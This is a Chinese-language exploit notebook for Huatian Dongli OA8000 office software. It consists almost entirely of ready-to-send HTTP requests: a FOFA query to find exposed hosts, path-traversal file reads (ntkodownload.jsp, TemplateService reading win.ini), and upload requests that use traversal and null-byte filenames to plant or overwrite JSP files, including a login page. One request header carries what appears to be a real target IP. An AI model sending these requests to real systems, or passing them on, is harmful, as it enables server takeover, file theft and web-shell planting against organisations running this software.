# 华天动力OA漏洞

## fofa
```
app="华天动力-OA8000"
```

## 华天动力OA_htpage-readfile任意文件读取漏洞
```
GET /OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../htoa/Tomcat/webapps/OAapp/jsp/trace/ntkodownload.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close

```

## htpage-MyHttpServlet-upload
```
POST /OAapp/MyHttpServlet?username=admin HTTP/1.1
Host: 
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=--------------------------533212604817836013445627
Content-Length: 233

----------------------------533212604817836013445627
Content-Disposition: form-data; name="file";filename="../../../../../../webapps/ROOT/qypzfeaz.jsp%00.jpg

qypzfeaz19689315
----------------------------533212604817836013445627--
```
文件路径
```
GET /qypzfeaz.jsp;.html HTTP/1.1
Host: 
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```

## htpages_upload
```

一、获取path,获取不到默认取D:/htoa/
POST /OAapp/jsp/upload.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://116.63.142.107:8081/OAapp/jsp/upload.jsp
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data;boundary=----WebKitFormBoundary5Ur8laykKAWws2QO
Content-Length: 290


------WebKitFormBoundary5Ur8laykKAWws2QO
Content-Disposition: form-data;name="file"; filename="xxx.xml"
Content-Type: image/png

real path
------WebKitFormBoundary5Ur8laykKAWws2QO
Content-Disposition: form-data;name="filename"

xxx.png
------WebKitFormBoundary5Ur8laykKAWws2QO--

二、将第一步获取的路径传到第二步的路径中
POST /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://116.63.142.107:8081/OAapp/jsp/upload.jsp
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm
Content-Length: 366

------WebKitFormBoundaryzRSYXfFlXqk6btQm
Content-Disposition: form-data;name="EDITFILE"; filename="xxx.txt"
Content-Type: image/png

otmgyrah
------WebKitFormBoundaryzRSYXfFlXqk6btQm
Content-Disposition: form-data; name="newFileName"

D:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp
------WebKitFormBoundaryzRSYXfFlXqk6btQm

三、文件路径
GET /OAapp/htpages/app/module/login/normalLoginPageForOther.jsp HTTP/1.1
Host: 
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```

## htpage-TemplateService-read-file
```

POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1
Host: baidu.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: text/xml
Content-Length: 99

<buffalo-call>
<method>getHtmlContent</method>
<string>C://windows/win.ini</string>
</buffalo-call>
```
